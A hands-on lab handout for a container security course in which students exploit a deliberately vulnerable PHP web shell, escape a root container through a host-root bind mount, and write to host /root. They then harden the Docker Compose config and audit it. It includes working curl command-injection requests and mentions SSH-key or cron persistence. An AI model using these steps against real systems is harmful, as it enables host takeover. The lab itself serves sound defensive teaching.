# Lab 03 - Break Out: Container Escape & Mitigation

**Cybersecurity Lab Room S617 - Virtualization & Containerization**

> **Goal:** Actually *perform* a container escape - go from a bug in a web page
> to **full control of the host** - then **fix it** and prove the fix works.
> This is the hands-on version of the escapes you read about in Labs 00-01.

---

## ⚠️ Rules of engagement - read this first

- You will run a **deliberately vulnerable app** and attack it. Do this **only
  on your own S617 workshop VM**. The "host" you compromise is **your own
  disposable VM** - nothing leaves it.
- Doing any of this to a system you don't own is a **crime**. The skill you're
  building here is **defense**: you attack a target you control so you can learn
  to protect real ones.
- If anything feels broken, `vagrant destroy -f && vagrant up` gives you a clean
  VM back in minutes.

---

## The scenario

A developer containerized a PHP app and, to "make file access easy," mounted the
**host's entire filesystem** into the container - and left it running as
**root**. The app also has a classic bug. Each mistake alone is bad; together
they're a full host takeover. Let's prove it.

The files are in **`docker-demo/escape/`**:
- `site/index.php` - the vulnerable app (a "web shell")
- `docker-compose.yml` - the misconfigured (vulnerable) stack
- `docker-compose.hardened.yml` - the fixed stack (for the mitigation)

---

## Part 1 - Deploy the vulnerable app

```bash
cd docker-demo/escape
cat docker-compose.yml        # read it - spot the two mistakes
docker compose up -d
```

Read `docker-compose.yml` before moving on. The two red flags: the container
runs as **root**, and `- /:/hostroot` mounts the **whole host filesystem** into
the container, read-write.

> 📸 **Screenshot:** _the compose file, with the `/:/hostroot` line visible._

---

## Part 2 - Get code execution (the web bug)

Open the app at **`http://localhost:8081`** - in **your computer's browser**
(the port is forwarded to your host), or with `curl` from inside the VM:

```bash
curl "http://localhost:8081/?cmd=id"
```

The page runs your command. `id` shows you're **root inside the container**:

```
uid=0(root) gid=0(root) groups=0(root)
```

That's **Remote Code Execution** - the app handed you a shell. Poke around:

```bash
curl "http://localhost:8081/?cmd=hostname"      # the container's ID
curl "http://localhost:8081/?cmd=ls%20/"        # the container's filesystem
```

> 📸 **Screenshot:** _the `?cmd=id` output showing `uid=0(root)`._

> `%20` is just a URL-encoded space. In the **browser** you can type normal
> spaces: `http://localhost:8081/?cmd=ls /`.

---

## Part 3 - Escape to the host

You're root in the container - but the prize is the **host**. Remember the
mount: the host's `/` is sitting at `/hostroot` inside the container. Look:

```bash
curl "http://localhost:8081/?cmd=ls%20/hostroot"            # the HOST filesystem!
curl "http://localhost:8081/?cmd=cat%20/hostroot/etc/hostname"
```

You're reading the host's files through a web page. Now **write** to the host -
drop a proof file into the host's `/root` (a directory only host-root can touch):

```bash
curl "http://localhost:8081/?cmd=sh%20-c%20'echo%20PWNED-BY-S617%20%3E%20/hostroot/root/ESCAPED.txt'"
```

**Now prove it from the host side.** Open a normal terminal on the VM (XFCE
Terminal or `vagrant ssh`) and look:

```bash
sudo cat /root/ESCAPED.txt
```

There it is - a file written to the host's `/root` **by a web request to a
container**. That is a container escape: the isolation was defeated by a
misconfiguration, not a magic exploit.

> 📸 **Screenshot:** _`sudo cat /root/ESCAPED.txt` on the host showing your
> message - the money shot._

**Why it worked (say it in one sentence):** the container ran as root *and* the
host filesystem was mounted inside it, so "root in the container" became "root
on the host." In the real world the next steps would be persistence - adding an
SSH key to `/hostroot/root/.ssh/` or a cron job. You don't need to; you've
proven the point.

Tear it down:

```bash
cd ~/<path>/docker-demo/escape   # (wherever the files are)
docker compose down
sudo rm -f /root/ESCAPED.txt      # clean up the proof file
```

---

## Part 4 - Mitigate: make the escape impossible

Read the hardened file and compare it to the vulnerable one:

```bash
cat docker-compose.hardened.yml
```

Four fixes, each shutting a door:
- **No host bind-mount** - the `/:/hostroot` line is gone. *There is nothing to
  escape to.* (This is the big one.)
- **Runs as a non-root user** (`user: "1000:1000"`).
- **App directory mounted read-only** (`:ro`).
- **All capabilities dropped** + **no-new-privileges**.

Bring up the hardened version and attack it the same way:

```bash
docker compose -f docker-compose.hardened.yml up -d
curl "http://localhost:8081/?cmd=id"              # still runs... but NOT root now
curl "http://localhost:8081/?cmd=ls%20/hostroot"  # no such directory - gone!
```

The web shell **still works** (the app is still buggy), but the escape **fails**:
you're not root, and there's no host mount to reach. That's **defense in depth**
- you assume the app gets popped, and the container config stops it from
becoming a host compromise.

> 📸 **Screenshot:** _`?cmd=id` showing a non-root uid, and `ls /hostroot`
> failing on the hardened stack._

Tear it down:

```bash
docker compose -f docker-compose.hardened.yml down
```

---

## Part 5 - The defender's view: catch it before it ships

You don't want to *discover* these by being breached. Inspect a running
container's configuration - this is what a reviewer or a scanner checks:

```bash
# Bring the vulnerable stack back up briefly, then inspect it:
docker compose up -d
docker inspect escape-web-1 --format 'User={{.Config.User}}  Privileged={{.HostConfig.Privileged}}'
docker inspect escape-web-1 --format 'Mounts={{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}'
docker compose down
```

(Container name may differ - `docker ps` shows it.) The red flags you're looking
for: an **empty User** (means root), **Privileged=true**, or a **Mount whose
source is `/`** or another sensitive host path. Any of those in a review is a
finding.

**Your hardening checklist** (keep this - it's resume-ready knowledge):
- Run containers as a **non-root** user.
- **Never** bind-mount the host root or sensitive paths; if you must mount, scope
  it tightly and use `:ro`.
- **Drop capabilities** (`cap_drop: ALL`) and set **`no-new-privileges`**.
- Avoid **`--privileged`**.
- Don't mount the **Docker socket** into untrusted containers.
- Use **user namespaces** so container-root ≠ host-root.
- And of course: **fix the app** - never pass user input to a shell.

---

## Cleanup

```bash
docker compose down 2>/dev/null
docker compose -f docker-compose.hardened.yml down 2>/dev/null
sudo rm -f /root/ESCAPED.txt
```

Or just `vagrant destroy -f && vagrant up` for a guaranteed clean slate.

---

## Show it off - add this to your portfolio & resume

This is a standout piece - most junior candidates have never *performed* a
container escape, let alone remediated one.

**Portfolio deliverable** (commit under `submissions/<your-username>/lab03/`):
1. The `?cmd=id` output showing root in the container.
2. `sudo cat /root/ESCAPED.txt` on the host - proof of the escape.
3. The hardened stack blocking the escape (`ls /hostroot` failing, non-root id).
4. **In your own words:** which single misconfiguration made the escape
   possible, and the one change that would have prevented it.

**Resume / interview framing:**
- "Performed and remediated a container-to-host escape via an over-permissive
  bind-mount and root execution; applied least-privilege container hardening
  (non-root, dropped capabilities, read-only mounts, no-new-privileges)."
- Be ready to explain: *why* did root-in-container + host mount = host root, and
  what is "defense in depth" here?

> **Why this matters:** "I know containers can be escaped" is a claim. "Here's
> the escape I performed and the hardening that stopped it" is **proof** - and
> proof is what gets interviews.

---

### One-line summary to remember

> A container escape is usually not a magic exploit - it's a **misconfiguration**.
> Root in the container plus the host filesystem mounted inside it turns a web
> bug into host takeover. **Least privilege** - non-root, no host mounts, dropped
> capabilities - is what keeps a popped app from becoming a popped host.
